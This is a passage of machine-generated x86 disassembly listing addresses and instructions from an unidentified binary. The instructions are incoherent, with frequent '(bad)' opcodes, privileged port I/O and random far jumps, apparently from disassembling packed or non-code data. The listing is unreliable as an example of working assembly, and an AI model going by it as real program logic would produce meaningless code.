  41ef8e:	xor    BYTE PTR [edx+0x62a337bf],bl
  41ef94:	or     ebp,0xac25455f
  41ef9a:	je     0x41ef77
  41ef9c:	mov    bh,0x50
  41ef9e:	jmp    0x4bfcd35d
  41efa3:	stos   DWORD PTR es:[edi],eax
  41efa4:	mov    edi,0x890897d9
  41efa9:	sub    dh,BYTE PTR [ebx+0x1e65bc6f]
  41efaf:	cmp    eax,0xc7910454
  41efb4:	call   0xc668:0x9547a31d
  41efbb:	aas    
  41efbc:	push   edi
  41efbd:	adc    ecx,ebx
  41efbf:	or     DWORD PTR [ebp+0x3caffb87],0x3381fdc9
  41efc9:	(bad)  
  41efcb:	into   
  41efcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efcd:	sub    eax,0xb0010b2c
  41efd2:	cmc    
  41efd3:	ror    BYTE PTR [ebp-0x16b2f18e],1
  41efd9:	mov    ds:0x9042e792,eax
  41efde:	dec    eax
  41efdf:	imul   ebx,edi,0xffffffaa
  41efe2:	xlat   BYTE PTR ds:[ebx]
  41efe3:	add    eax,0xbac1815b
  41efe8:	(bad)  
  41efe9:	ficom  DWORD PTR [ebx+0x1]
  41efec:	adc    eax,0xe5b98d57
  41eff1:	or     al,0xcf
  41eff3:	xor    DWORD PTR [edi+eax*8],0xacf00112
  41effa:	add    eax,0xfe611bda
  41efff:	or     esp,eax
  41f001:	repnz leave 
  41f003:	sub    ecx,DWORD PTR [esi+0x32]
  41f006:	fld    QWORD PTR [edx]
  41f008:	xor    BYTE PTR [edx+ebp*2],bh
  41f00b:	mov    esi,0x86dd6586
  41f010:	push   esp
  41f011:	jno    0x41efb2
  41f013:	imul   edx,DWORD PTR [ecx-0x5630a643],0x339029fd
  41f01d:	in     al,0xf3
  41f01f:	sbb    al,0xb7
  41f021:	mov    ds:0x5613a908,al
  41f026:	pusha  
  41f027:	cwde   
  41f028:	dec    eax
  41f029:	jo     0x41f03b
  41f02b:	mov    ?,WORD PTR [edi]
  41f02d:	dec    ecx
  41f02e:	add    dl,al
  41f030:	sub    edx,edi
  41f032:	dec    edi
  41f033:	xor    ebx,ebx
  41f035:	adc    esi,esi
  41f037:	neg    DWORD PTR [ebx-0x3d]
  41f03a:	add    ah,BYTE PTR [ebp+edx*4-0x5d]
  41f03e:	and    al,0xd6
  41f040:	sar    DWORD PTR [ebx],1
  41f042:	ja     0x41f060
  41f044:	scas   eax,DWORD PTR es:[edi]
  41f045:	out    0x47,eax
  41f047:	cdq    
  41f048:	dec    ecx
  41f049:	jle    0x41f032
  41f04b:	addr16 jns 0x41f038
  41f04e:	pop    edi
  41f04f:	mov    ebx,0x8b89c310
  41f054:	mov    al,0x60
  41f056:	xor    al,0x16
  41f058:	cmc    
  41f059:	or     bh,cl
  41f05b:	icebp  
  41f05c:	dec    edx
  41f05d:	pop    edi
  41f05e:	loop   0x41f0a7
  41f060:	scas   eax,DWORD PTR es:[edi]
  41f061:	inc    esi
  41f062:	xchg   edi,eax
  41f063:	mov    ds:0xcb45a269,eax
  41f068:	add    bl,BYTE PTR [ecx+0x4c]
  41f06b:	dec    ebp
  41f06c:	jl     0x41f031
  41f06e:	and    al,0x65
  41f070:	fild   WORD PTR [eax]
  41f072:	fs cdq 
  41f074:	sti    
  41f075:	ror    DWORD PTR [ebx],0xca
  41f078:	jo     0x41f007
  41f07a:	scas   eax,DWORD PTR es:[edi]
  41f07b:	push   edx
  41f07c:	add    edx,ebx
  41f07e:	mov    esi,0xa98396e5
  41f083:	push   esi
  41f085:	cmp    eax,0x7c3ab2b8
  41f08a:	cld    
  41f08b:	sub    BYTE PTR [ecx-0x65babf28],cl
  41f091:	mov    bh,0xbb
  41f093:	ins    DWORD PTR es:[edi],dx
  41f094:	mov    ebx,0x24469d11
  41f099:	cmc    
  41f09a:	test   eax,0x91496dc5
  41f09f:	out    0xca,al
  41f0a1:	adc    ebp,DWORD PTR [edi+0x76]
  41f0a4:	adc    BYTE PTR [edi],0x58
  41f0a7:	jb     0x41f07b
  41f0a9:	mov    bh,0x5b
  41f0ab:	mov    bh,BYTE PTR [ebp+0x1d6fa203]
  41f0b1:	jg     0x41f064
  41f0b3:	in     al,dx
  41f0b4:	adc    dh,BYTE PTR [esi-0x62b8968]
  41f0ba:	cld    
  41f0bb:	std    
  41f0bc:	loop   0x41f04c
  41f0be:	repnz add DWORD PTR [edx+0x4e],eax
  41f0c2:	lahf   
  41f0c3:	pop    edi
  41f0c4:	mov    WORD PTR [edi],cs
  41f0c6:	inc    ecx
  41f0c7:	inc    ebx
  41f0c8:	rol    BYTE PTR [ebx+0x24],0x28
  41f0cc:	icebp  
  41f0cd:	sbb    al,0xa3
  41f0cf:	jae    0x41f0c9
  41f0d1:	outs   dx,DWORD PTR ds:[esi]
  41f0d2:	aad    0x57
  41f0d4:	adc    eax,0x659524d6
  41f0d9:	mov    esp,0x2a73a3aa
  41f0de:	sub    DWORD PTR [ecx+0x4d],esp
  41f0e1:	hlt    
  41f0e2:	std    
  41f0e3:	lahf   
  41f0e4:	repz neg BYTE PTR [eax+0x19]
  41f0e8:	or     al,ah
  41f0ea:	inc    cl
  41f0ec:	sub    DWORD PTR [esi-0x4211eb02],edi
  41f0f2:	clc    
  41f0f3:	arpl   sp,cx
  41f0f5:	out    0x51,al
  41f0f7:	dec    ebp
  41f0f8:	(bad)  
  41f0f9:	pushf  
  41f0fa:	test   DWORD PTR [ebp-0x75],0x863aa7fc
  41f101:	jnp    0x41f0b9
  41f103:	jne    0x41f0d0
  41f105:	mov    esp,0x4c8810a4
  41f10a:	outs   dx,DWORD PTR ds:[esi]
  41f10b:	mov    ch,0x5c
  41f10d:	aas    
  41f10e:	and    eax,0x4b09490c
  41f113:	jne    0x41f160
  41f115:	daa    
  41f116:	je     0x41f0c4
  41f118:	inc    esi
  41f119:	mov    ebx,0xbb99ab4a
  41f11e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f11f:	inc    ebx
  41f120:	pop    ecx
  41f121:	or     BYTE PTR [edi+eax*4+0x1e4d02bc],dh
  41f128:	pusha  
  41f129:	aad    0x3f
  41f12b:	sbb    eax,0x2f58381d
  41f130:	push   ds
  41f131:	xlat   BYTE PTR ds:[ebx]
  41f132:	mov    ecx,0xda5e8186
  41f137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f138:	mov    dh,0x99
  41f13a:	mov    edx,0x280a8b7f
  41f13f:	pop    ss
  41f140:	xor    eax,0xe98da4c4
  41f145:	daa    
  41f146:	and    DWORD PTR [ebp+ebp*2-0x34259bbf],esp
  41f14d:	pop    edx
  41f14e:	adc    edx,DWORD PTR [eax]
  41f150:	mov    cl,0x16
  41f152:	outs   dx,WORD PTR ds:[esi]
  41f154:	jecxz  0x41f1c6
  41f156:	stos   BYTE PTR es:[edi],al
  41f157:	mov    dh,0x1f
  41f159:	add    al,BYTE PTR [edx]
  41f15b:	mov    edx,0x498b4e96
  41f160:	lods   eax,DWORD PTR ds:[esi]
  41f161:	pop    ebx
  41f162:	jo     0x41f1c0
  41f164:	mov    ds:0x19067f04,al
  41f169:	iret   
  41f16a:	mov    ds:0x87d901cb,eax
  41f16f:	fadd   QWORD PTR [ebp-0x28]
  41f172:	lods   eax,DWORD PTR ds:[esi]
  41f173:	mov    bh,0x52
  41f175:	pop    ebx
  41f176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f177:	or     eax,0xb43760d3
  41f17c:	jmp    0xd884:0x8a407048
  41f183:	pmaxsw mm0,QWORD PTR [ebp+0x16717088]
  41f18a:	jecxz  0x41f197
  41f18c:	retf   0xdae6
  41f18f:	mov    ebp,0x52610f44
  41f194:	and    ecx,ebp
  41f196:	xchg   DWORD PTR [edx-0x4442c33a],edx
  41f19c:	mov    DWORD PTR [ecx+0x539f46e1],esp
  41f1a2:	xchg   DWORD PTR [ecx-0x1a0041f5],esp
  41f1a8:	mov    eax,ds:0xb342fc30
  41f1ad:	loopne 0x41f177
  41f1af:	sbb    dh,BYTE PTR [ecx+0x63]
  41f1b2:	ret    0x8014
  41f1b5:	frstor [eax]
  41f1b7:	retf   
  41f1b8:	loope  0x41f20a
  41f1ba:	cli    
  41f1bb:	call   0x1fe99de7
  41f1c0:	fst    st(0)
  41f1c2:	add    al,0xb1
  41f1c4:	cdq    
  41f1c5:	sub    eax,0xc5def8b
  41f1ca:	lds    ebp,FWORD PTR [ebp+0x24284fd2]
  41f1d0:	aas    
  41f1d1:	mov    eax,0x6a6e7a91
  41f1d6:	into   
  41f1d7:	push   esp
  41f1d8:	xchg   DWORD PTR [esi-0x539fd271],edi
  41f1de:	dec    esp
  41f1df:	mov    ds:0xa6e9330c,eax
  41f1e4:	and    ebp,DWORD PTR [ebx+0x5f1ae03]
  41f1ea:	aad    0x67
  41f1ec:	sbb    eax,0x2901b4fe
  41f1f1:	mov    fs,WORD PTR [eax]
  41f1f3:	xor    BYTE PTR [eax],cl
  41f1f5:	sahf   
  41f1f6:	jg     0x41f24c
  41f1f8:	xor    al,0x8b
  41f1fa:	(bad)  
  41f1fb:	fs push edx
  41f1fd:	out    dx,al
  41f1fe:	add    BYTE PTR [ecx],0x55
  41f201:	cmp    ah,ah
  41f203:	mov    ds:0x9b32f737,eax
  41f209:	jmp    FWORD PTR [edx+0x3671cd94]
  41f20f:	mov    DWORD PTR fs:[ebx],edi
  41f212:	cmp    BYTE PTR [ebp-0x4cf2b0ec],0x5d
  41f219:	and    DWORD PTR [ebp+0x18],edx
  41f21c:	popf   
  41f21d:	sbb    BYTE PTR [esi],ah
  41f21f:	mov    ch,0xe2
  41f221:	mov    bh,0x99
  41f223:	fstp   TBYTE PTR [edx]
  41f225:	mov    ch,0x36
  41f227:	les    esp,FWORD PTR [ecx]
  41f229:	test   eax,0xcaac25db
  41f22e:	inc    edx
  41f22f:	xor    DWORD PTR [ebx-0x18],eax
  41f232:	pinsrw mm6,WORD PTR [edi+eiz*2-0x5e],0xe0
  41f238:	push   ss
  41f239:	aam    0x56
  41f23b:	jge    0x41f21c
  41f23d:	daa    
  41f23e:	and    edi,DWORD PTR ds:0x71a992b2
  41f244:	pop    ecx
  41f245:	addr16 pop ecx
  41f247:	cdq    
  41f248:	xor    eax,DWORD PTR [eax]
  41f24a:	jp     0x41f29e
  41f24c:	push   edi
  41f24d:	outs   dx,DWORD PTR ds:[esi]
  41f24e:	int3   
  41f24f:	xor    BYTE PTR [ebp+0x75],bh
  41f252:	pop    ecx
  41f253:	xchg   bp,ax
  41f255:	push   eax
  41f256:	jle    0x41f21a
  41f258:	or     al,0x79
  41f25a:	loopne 0x41f28e
  41f25c:	xor    eax,0x5c2ee23
  41f261:	dec    esi
  41f262:	sbb    bh,ch
  41f264:	aam    0xec
  41f266:	jb     0x41f1fe
  41f268:	neg    dl
  41f26a:	mov    ds:0x86cce153,al
  41f26f:	pop    ss
  41f270:	and    eax,0x1209d605
  41f275:	fisttp QWORD PTR [edi+0xe]
  41f278:	push   ecx
  41f279:	(bad)  
  41f27a:	jle    0x41f23b
  41f27c:	xchg   edx,eax
  41f27d:	call   0xdcee:0xfb2a1238
  41f284:	ins    DWORD PTR es:[edi],dx
  41f285:	loopne 0x41f2a9
  41f287:	cld    
  41f288:	add    eax,0x93243259
  41f28d:	das    
  41f28e:	ret    0x271e
  41f291:	jns    0x41f29d
  41f293:	cmp    ebp,eax
  41f295:	push   edx
  41f296:	(bad)  
  41f297:	std    
  41f298:	jle    0x41f2b7
  41f29a:	data16 imul BYTE PTR [edx]
  41f29d:	add    DWORD PTR [edx-0x7a],ebp
  41f2a0:	enter  0x624e,0x40
  41f2a4:	push   esi
  41f2a5:	dec    eax
  41f2a6:	arpl   WORD PTR [eax+eax*4-0x6b2ac92d],ax
  41f2ad:	xchg   ecx,eax
  41f2ae:	popf   
  41f2af:	mov    bh,BYTE PTR [ebp-0x3f]
  41f2b2:	test   eax,0xb0a8f66
  41f2b7:	mov    BYTE PTR [ecx+esi*2-0x5c],dh
  41f2bb:	test   esp,0x52d28a12
  41f2c1:	pop    DWORD PTR [esp+eax*8-0x3f48f933]
  41f2c8:	push   cs
  41f2c9:	xor    DWORD PTR [edx],edx
  41f2cb:	jecxz  0x41f2d6
  41f2cd:	pop    edx
  41f2ce:	ja     0x41f2e6
  41f2d0:	mov    bh,ch
  41f2d2:	jmp    0x94fc:0x1770e508
  41f2d9:	push   ecx
  41f2da:	sub    DWORD PTR [ecx-0xcf7aef6],0x2c
  41f2e1:	xor    bl,bl
  41f2e3:	jmp    0x41f27c
  41f2e5:	sub    ebx,DWORD PTR [edx-0x1b84ee02]
  41f2eb:	and    dh,BYTE PTR [ecx-0x33df036d]
  41f2f1:	ror    DWORD PTR [eax],0x1e
  41f2f4:	xchg   ecx,eax
  41f2f5:	jno    0x41f2dc
  41f2f7:	(bad)  
  41f2f8:	test   al,0xa2
  41f2fa:	int    0x66
  41f2fc:	pop    ss
  41f2fd:	dec    eax
  41f2fe:	aaa    
  41f2ff:	adc    eax,DWORD PTR [edx]
  41f301:	icebp  
  41f302:	paddusb mm4,QWORD PTR [esi-0x235ebf99]
  41f309:	push   esp
  41f30a:	loope  0x41f28d
  41f30c:	push   ebx
  41f30d:	dec    ecx
  41f30e:	mov    ebx,0xd4d4c7da
  41f313:	jne    0x41f2fc
  41f315:	adc    eax,0x752577bf
  41f31a:	sbb    BYTE PTR [edi-0x4207859e],bl
  41f320:	inc    ebx
  41f321:	stos   BYTE PTR es:[edi],al
  41f322:	sti    
  41f323:	das    
  41f324:	jno    0x41f2d7
  41f326:	mov    ah,bl
  41f328:	xor    DWORD PTR [ecx+0x3aeeecdc],0xb71ea4d9
  41f332:	xchg   esp,eax
  41f333:	outs   dx,DWORD PTR ds:[esi]
  41f334:	sub    DWORD PTR [edx+0x1c],ebp
  41f337:	cld    
  41f338:	shl    BYTE PTR [ecx],cl
  41f33a:	jbe    0x41f379
  41f33c:	pop    ebx
  41f33d:	xor    eax,ebx
  41f33f:	aas    
  41f340:	jns    0x41f39c
  41f342:	popa   
  41f343:	xlat   BYTE PTR ds:[ebx]
  41f344:	mov    edx,0x2d811c75
  41f349:	popa   
  41f34a:	inc    ecx
  41f34b:	and    DWORD PTR [ecx],esi
  41f34d:	pop    ds
  41f34e:	push   ecx
  41f34f:	and    al,0xe1
  41f351:	pop    es
  41f352:	rcr    dh,cl
  41f354:	adc    BYTE PTR [ecx-0x18],cl
  41f357:	aaa    
  41f358:	inc    esi
  41f359:	push   ds
  41f35a:	xchg   ecx,esp
  41f35c:	pop    ds
  41f35d:	jge    0x41f371
  41f35f:	outs   dx,BYTE PTR ds:[esi]
  41f360:	cmp    eax,ecx
  41f362:	add    al,0x6e
  41f364:	inc    edx
  41f365:	xchg   esp,eax
  41f366:	xlat   BYTE PTR ds:[ebx]
  41f367:	aaa    
  41f368:	mov    ds:0x321a208d,eax
  41f36d:	mov    ebx,0x42fe108d
  41f372:	mov    WORD PTR [eax+0xbfbaa5],?
  41f378:	retf   
  41f379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f37a:	jns    0x41f3bf
  41f37c:	shr    DWORD PTR [edx-0x5b46f8b0],0xe1
  41f383:	jecxz  0x41f386
  41f385:	mov    DWORD PTR [edx+0x39356675],ebp
  41f38b:	xor    eax,0x8a9f32b1
  41f390:	sub    edi,DWORD PTR [esi]
  41f392:	ins    DWORD PTR es:[edi],dx
  41f393:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41f395:	lds    eax,FWORD PTR [esi-0x5a]
  41f398:	pop    ds
  41f399:	jmp    0x2872b0fd
  41f39e:	call   FWORD PTR [edi-0x5188ebde]
  41f3a4:	loopne 0x41f3b4
  41f3a6:	inc    eax
  41f3a7:	fwait
  41f3a8:	mov    ecx,0x748d8143
  41f3ad:	xchg   DWORD PTR [ecx-0x185c687f],ebp
  41f3b3:	jnp    0x41f343
  41f3b5:	cmp    al,0xdc
  41f3b7:	jg     0x41f33d
  41f3b9:	lea    edx,[eax+0x74]
  41f3bc:	xchg   esi,eax
  41f3bd:	xor    eax,0xf6b9bb22
  41f3c2:	repz leave 
  41f3c4:	cli    
  41f3c5:	in     eax,0x4e
  41f3c7:	enter  0x964a,0x6
  41f3cb:	scas   al,BYTE PTR es:[edi]
  41f3cc:	add    dh,BYTE PTR [ebx-0x21]
  41f3cf:	pop    ebx
  41f3d0:	lock xchg edx,eax
  41f3d2:	out    dx,eax
  41f3d3:	and    al,al
  41f3d5:	imul   eax
  41f3d7:	les    ax,DWORD PTR [ebx]
  41f3da:	js     0x41f397
  41f3dc:	out    0x2d,eax
  41f3de:	loop   0x41f39d
  41f3e0:	jmp    0xbecbb296
  41f3e5:	lods   eax,DWORD PTR ds:[esi]
  41f3e6:	cwde   
  41f3e7:	xor    BYTE PTR [edx],dh
  41f3e9:	dec    ebp
  41f3ea:	push   0x21
  41f3ec:	shr    DWORD PTR [esi],0x1
  41f3ef:	shl    DWORD PTR [edx],0x62
  41f3f2:	stc    
  41f3f3:	cmp    al,0x2c
  41f3f5:	(bad)  
  41f3f7:	sub    ebp,DWORD PTR ss:[esi]
  41f3fa:	faddp  st(0),st
  41f3fc:	mov    ebx,0x398e8f5e
  41f401:	dec    ax
  41f403:	fstp   QWORD PTR [esi]
  41f405:	out    dx,al
  41f406:	xchg   ecx,eax
  41f407:	push   ds
  41f408:	(bad)  
  41f409:	retf   
  41f40a:	mov    eax,ds:0xcac51637
  41f40f:	popf   
  41f410:	dec    esp
  41f411:	es jmp 0x82db6508
  41f417:	(bad)  
  41f418:	push   ecx
  41f419:	push   esi
  41f41a:	xor    al,0x3e
  41f41c:	and    BYTE PTR [edx],bl
  41f41e:	or     al,0xe8
  41f420:	xchg   DWORD PTR [ebp+0x45a7e4a5],ebx
  41f426:	xchg   ebx,eax
  41f427:	mov    ecx,0xcd5dd5b3
  41f42c:	imul   esi,DWORD PTR [ecx-0x23],0xfffffff9
  41f430:	xchg   ebp,eax
  41f431:	mov    cl,0x7b
  41f433:	inc    ecx
  41f434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f435:	repnz mov eax,0xc2b571cc
  41f43b:	xchg   al,dl
  41f43d:	mov    ebx,0xdf296d18
  41f442:	(bad)  
  41f443:	leave  
  41f444:	enter  0x1681,0x3c
  41f448:	push   ecx
  41f449:	push   0x22
  41f44b:	sbb    bl,BYTE PTR [ebp-0x30]
  41f44e:	into   
  41f44f:	inc    eax
  41f450:	iret   
  41f451:	(bad)  
  41f452:	xchg   ecx,eax
  41f453:	pop    ds
  41f454:	mov    ah,0x81
  41f456:	in     al,0x7c
  41f458:	add    DWORD PTR [esi+esi*1+0x39f45f1d],esp
  41f45f:	sbb    esp,DWORD PTR [esi+edi*4-0x70]
  41f463:	fs ror bh,1
  41f466:	sahf   
  41f467:	dec    esi
  41f468:	add    dl,bl
  41f46a:	cs ret 
  41f46c:	dec    edi
  41f46d:	fwait
  41f46e:	test   eax,0xe0e7e798
  41f473:	std    
  41f474:	cmp    DWORD PTR [ebx-0x395d4783],esp
  41f47a:	add    eax,0xe42f0f3f
  41f47f:	or     eax,0xeb82520c
  41f484:	xchg   esp,eax
  41f485:	dec    ebx
  41f486:	pusha  
  41f487:	pop    edx
  41f488:	test   eax,0xc4195bc2
  41f48d:	imul   edi,DWORD PTR [edx+0x2268d8be],0x4bb2814c
  41f497:	aas    
  41f498:	mov    ah,0x19
  41f49a:	or     DWORD PTR [edx+ebp*4],edx
  41f49d:	out    dx,al
  41f49e:	int3   
  41f49f:	(bad)  
  41f4a0:	mov    BYTE PTR [ebp-0x1be99977],cl
  41f4a6:	mov    dh,0x66
  41f4a8:	sub    ebx,ebp
  41f4aa:	lods   al,BYTE PTR ds:[esi]
  41f4ab:	fld    QWORD PTR [edx+0x5a]
  41f4ae:	jecxz  0x41f516
  41f4b0:	scas   eax,DWORD PTR es:[edi]
  41f4b1:	sahf   
  41f4b2:	dec    edx
  41f4b3:	fst    QWORD PTR [edx-0x3d]
  41f4b6:	dec    esi
  41f4b7:	lods   al,BYTE PTR ds:[esi]
  41f4b8:	and    DWORD PTR [edi+0x25],ebp
  41f4bb:	test   eax,0x6652d49d
  41f4c0:	lds    esp,FWORD PTR [ecx+0x2d00e4ec]
  41f4c6:	clc    
  41f4c7:	inc    edi
  41f4c8:	icebp  
  41f4c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ca:	jae    0x41f520
  41f4cc:	out    0x4a,al
  41f4ce:	push   0xfffffffd
  41f4d0:	mov    ecx,0xa2b772c7
  41f4d5:	add    DWORD PTR [ebx+0x74],ebp
  41f4d8:	xlat   BYTE PTR ds:[ebx]
  41f4d9:	mov    dh,0xd4
  41f4db:	mov    dh,0x70
  41f4dd:	mov    esp,0xfdc15fe1
  41f4e2:	adc    eax,0x86393b44
  41f4e7:	nop
  41f4e8:	jne    0x41f471
  41f4ea:	loope  0x41f55a
  41f4ec:	(bad)  
  41f4ed:	adc    ah,BYTE PTR [ebx+0x65]
  41f4f0:	test   eax,0xfa0c7c74
  41f4f5:	jl     0x41f479
  41f4f7:	sub    DWORD PTR ss:[ebp-0xb90d8f0],esp
  41f4fe:	sar    BYTE PTR [edi+0x6158e92e],0xcd
  41f505:	aas    
  41f506:	ret    0x69d0
  41f509:	fadd   QWORD PTR ds:0xcf82d903
  41f50f:	sar    DWORD PTR [edi],1
  41f511:	lds    ebx,FWORD PTR [edx-0x4346c901]
  41f517:	nop
  41f518:	and    dl,BYTE PTR [eax-0x64]
  41f51b:	dec    esp
  41f51c:	pop    ss
  41f51d:	pop    es
  41f51e:	fstp   TBYTE PTR [edi+0x75521071]
  41f524:	hlt    
  41f525:	and    al,0xca
  41f527:	mov    ebp,0xc759f570
  41f52c:	pop    ds
  41f52d:	sub    DWORD PTR [esi-0x2afc3b4],edx
  41f533:	pusha  
  41f534:	fnstenv ds:0xf2b3c9fe
  41f53a:	jne    0x41f4c7
  41f53c:	push   esi
  41f53d:	inc    esp
  41f53e:	sbb    eax,0x6a82a6d5
  41f543:	jp     0x41f532
  41f545:	test   BYTE PTR [ecx+0x33],0xec
  41f549:	aad    0x3a
  41f54b:	jmp    0xe0a2:0x5161f54
  41f552:	and    eax,0xda934e7f
  41f557:	sbb    cl,dh
  41f559:	lds    esi,FWORD PTR [ebp+0x206faf32]
  41f55f:	jae    0x41f57a
  41f561:	xchg   edx,eax
  41f562:	fwait
  41f563:	call   0xdd8f23d0
  41f568:	test   eax,0x4793bbda
  41f56d:	or     ecx,esi
  41f56f:	adc    al,0xe3
  41f571:	cmp    al,bl
  41f573:	or     ebx,DWORD PTR [esi]
  41f575:	inc    eax
  41f576:	cmp    ebp,edx
  41f578:	cld    
  41f579:	mov    ecx,0xf5c26f44
  41f57e:	sbb    BYTE PTR [edx-0x6b47c198],ch
  41f584:	(bad)  [esi]
  41f586:	inc    esp
  41f587:	xchg   esp,eax
  41f588:	dec    ecx
  41f589:	sbb    BYTE PTR ds:0x494ea7d2,dl
  41f58f:	mul    cl
  41f591:	loop   0x41f612
  41f593:	test   BYTE PTR [edx-0x1d],0x4b
  41f597:	outs   dx,BYTE PTR ds:[esi]
  41f598:	adc    ebx,DWORD PTR [esi+eiz*2]
  41f59b:	sub    edx,DWORD PTR [edi-0x7fa18edb]
  41f5a1:	(bad)
  41f5a4:	xor    eax,ecx
  41f5a6:	dec    ebp
  41f5a7:	pop    ebp
  41f5a8:	push   edi
  41f5a9:	mov    edi,0xb725ac4a
  41f5ae:	xchg   esi,eax
  41f5af:	(bad)  
  41f5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b1:	or     al,0x72
  41f5b3:	dec    edi
  41f5b4:	ret    0x7c9f
  41f5b7:	hlt    
  41f5b8:	jb     0x41f550
  41f5ba:	sub    eax,0x210d9894
  41f5bf:	test   ch,al
  41f5c1:	add    al,0x7c
  41f5c3:	in     al,dx
  41f5c4:	mov    WORD PTR [esp+eax*1+0x72],?
  41f5c8:	retf   0xdf8
  41f5cb:	shl    BYTE PTR [ebp+0x25e32fd8],0x8d
  41f5d2:	test   eax,0x269677c5
  41f5d7:	jmp    0x806b:0x4b598bc5
  41f5de:	es sbb al,0x6f
  41f5e1:	jmp    0x41f585
  41f5e3:	or     BYTE PTR [ebx-0x67],0x4e
  41f5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5e8:	in     al,0xc9
  41f5ea:	or     ebp,DWORD PTR [edi+0x30]
  41f5ed:	or     edi,DWORD PTR [eax]
  41f5ef:	inc    ecx
  41f5f0:	loope  0x41f5f9
  41f5f2:	adc    dh,BYTE PTR [ebx+ebp*4+0x64]
  41f5f6:	push   edi
  41f5f7:	xor    DWORD PTR [esi-0x60],edx
  41f5fa:	sbb    ah,bh
  41f5fc:	pop    es
  41f5fd:	xor    esp,ebp
  41f5ff:	and    esi,DWORD PTR [ebx+0x38459637]
  41f605:	mov    edx,0xbbd86276
  41f60a:	cdq    
  41f60b:	adc    DWORD PTR [ebx-0x40],ecx
  41f60e:	jae    0x41f5fa
  41f610:	cmp    eax,0x8591e8ff
  41f615:	aaa    
  41f616:	iret   
  41f617:	imul   ebp,DWORD PTR [esi],0xc8218585
  41f61d:	push   cs
  41f61e:	fwait
  41f61f:	outs   dx,BYTE PTR ds:[esi]
  41f620:	cld    
  41f621:	test   al,0x7f
  41f623:	mov    dl,0x7a
  41f625:	lock xchg ebx,eax
  41f627:	bound  edi,QWORD PTR fs:[esi+esi*4]
  41f62b:	(bad)  
  41f62c:	lods   eax,DWORD PTR ds:[esi]
  41f62d:	sti    
  41f62e:	dec    ebp
  41f62f:	inc    eax
  41f630:	mov    al,0xa6
  41f632:	stos   DWORD PTR es:[edi],eax
  41f633:	sti    
  41f634:	bound  ecx,QWORD PTR ds:0x43ee667d
  41f63a:	pop    eax
  41f63b:	xor    esp,DWORD PTR [esi+0x63]
  41f63e:	les    ecx,FWORD PTR [ebp-0x2b9b5156]
  41f644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f645:	sub    eax,DWORD PTR [ebx+0x4f2cbfc7]
  41f64b:	test   BYTE PTR [ecx-0x2b],dl
  41f64e:	pusha  
  41f64f:	cmp    esi,edx
  41f651:	test   DWORD PTR [ebx-0x1a],ebx
  41f654:	cmp    BYTE PTR [eax+ebx*2],ch
  41f657:	jmp    0x41f5e1
  41f659:	out    0x7a,eax
  41f65b:	pop    eax
  41f65c:	inc    ebx
  41f65d:	addr16 push 0x21
  41f660:	arpl   WORD PTR [edx],di
  41f662:	mov    ds:0x64d45cb2,eax
  41f667:	lods   eax,DWORD PTR ds:[esi]
  41f668:	or     DWORD PTR [ebx-0x73],esp
  41f66b:	mov    dh,0x91
  41f66d:	xor    al,0xc0
  41f66f:	mov    bh,BYTE PTR [ecx-0x46423748]
  41f675:	pop    es
  41f676:	in     eax,0xb8
  41f678:	push   cs
  41f679:	out    dx,eax
  41f67a:	jge    0x41f600
  41f67c:	dec    edi
  41f67d:	jmp    0x334e:0x5ae74dc4
  41f684:	test   al,0x47
  41f686:	xchg   esp,eax
  41f687:	cdq    
  41f688:	jb     0x41f645
  41f68a:	sar    DWORD PTR [edi],0x38
  41f68d:	xor    bl,BYTE PTR gs:[edx]
  41f690:	jmp    DWORD PTR [edx]
  41f692:	push   ebp
  41f693:	test   eax,0x4d4d1f38
  41f698:	sub    ch,BYTE PTR [eax-0x5c]
  41f69b:	lock xor BYTE PTR [eax-0x224653b9],cl
  41f6a2:	ds mov ecx,0x72cdbef4
  41f6a8:	jle    0x41f651
  41f6aa:	(bad)  
  41f6ab:	pop    ss
  41f6ac:	mov    WORD PTR [esi],ds
  41f6ae:	rol    DWORD PTR [ebx+0x2c],1
  41f6b1:	call   0xf58daaac
  41f6b6:	pop    eax
  41f6b7:	xor    dh,BYTE PTR [ebx+0x583bcde9]
  41f6bd:	adc    al,0xbe
  41f6bf:	(bad)  
  41f6c0:	xchg   esi,eax
  41f6c1:	mov    eax,ds:0x8687e981
  41f6c6:	cmp    eax,ecx
  41f6c8:	sub    BYTE PTR [ebx+0x78],bl
  41f6cb:	fsubrp st(1),st
  41f6cd:	xchg   edi,eax
  41f6ce:	dec    ebp
  41f6cf:	jo     0x41f727
  41f6d1:	and    BYTE PTR [ebp-0x29],bh
  41f6d4:	fnstcw WORD PTR [ebx]
  41f6d6:	add    DWORD PTR [esi-0x5d6b2f86],eax
  41f6dc:	or     al,0xb3
  41f6de:	lods   al,BYTE PTR ds:[esi]
  41f6df:	imul   esi,DWORD PTR [edx],0xa5846491
  41f6e5:	je     0x41f6f4
  41f6e7:	pop    esi
  41f6e8:	mov    ebp,0xc40c0cf9
  41f6ed:	cs dec esi
  41f6ef:	push   ebx
  41f6f0:	xchg   edx,eax
  41f6f1:	mov    cs,esp
  41f6f3:	sub    bl,BYTE PTR ds:0xf0a77dfe
  41f6f9:	inc    edi
  41f6fa:	pushf  
  41f6fb:	mov    BYTE PTR [edi],cl
  41f6fd:	out    dx,eax
  41f6fe:	jp     0x41f75a
  41f700:	xchg   esi,eax
  41f701:	inc    ecx
  41f702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f703:	or     DWORD PTR [edx+0x39],0xffffffa4
  41f707:	xor    dh,ah
  41f709:	shr    BYTE PTR [edx-0x52],1
  41f70c:	int3   
  41f70d:	out    dx,al
  41f70e:	dec    edi
  41f70f:	sbb    DWORD PTR [eax],0xffffffe2
  41f712:	loop   0x41f777
  41f714:	test   BYTE PTR ds:0x651cc514,al
  41f71a:	jp     0x41f754
  41f71c:	call   FWORD PTR [edi+eax*8+0x6e0934a5]
  41f723:	dec    edx
  41f724:	mov    al,0x46
  41f726:	push   ebx
